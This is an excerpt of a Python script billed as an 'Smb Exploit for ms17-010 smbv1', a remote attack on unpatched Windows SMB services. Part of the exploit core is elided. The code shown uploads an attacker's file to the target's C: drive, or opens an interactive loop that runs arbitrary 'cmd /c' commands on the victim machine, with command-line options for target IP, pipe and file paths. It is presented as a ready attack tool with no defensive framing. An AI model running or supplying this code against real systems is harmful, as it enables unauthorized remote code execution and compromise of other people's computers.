...
def smb_pwn(conn, arch):
	...
	#print('deleting file c:\\pwned.txt on the target')
	#tid2 = smbConn.connectTree('C$')
	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
	#fid2 = smbConn.deleteFile(tid2, '/pwned.txt')
	#smbConn.closeFile(tid2, fid2)
	#smbConn.disconnectTree(tid2)
	
	if args.cmd is False:
		print '[*] Sending',args.lfile
		smb_send_file(smbConn, args.lfile, 'C', '/'+args.rfile)
		print '[+] Sent -->',"C:\\{}".format(args.rfile)
	
	else:
		while True:
			res = raw_input('{}>>cmd /c '.format(args.target))
			cmd = r'cmd /c ' + res
			service_exec(conn, cmd)
			print '[*] Sending -->',cmd
			service_exec(conn, cmd)
			print '[+] Sent!'
...
parser = argparse.ArgumentParser(description='Smb Exploit for ms17-010 smbv1')
parser.add_argument('-t','--target', type=str, help='ip of target host',required=True)
parser.add_argument('-l','--lfile', type=str, help='local file to upload',default=False)
parser.add_argument('-r','--rfile', type=str, help='remote filename to save-as',default=False)
parser.add_argument('-p','--pipe', type=str, help='smb pipe name',required=True)
parser.add_argument('-c','--cmd', default=False, action='store_true',help='default mode is to upload a file or with this flag, run in "blind" cmd prompt mode')
args = parser.parse_args()

if args.cmd is False:
	if args.lfile is False or args.rfile is False:
		print("[-] You must specify a file to upload if you omit the {-c,--cmd} flag")
		parser.print_usage()
		sys.exit(1)
exploit(args.target, args.pipe)
print('Done')
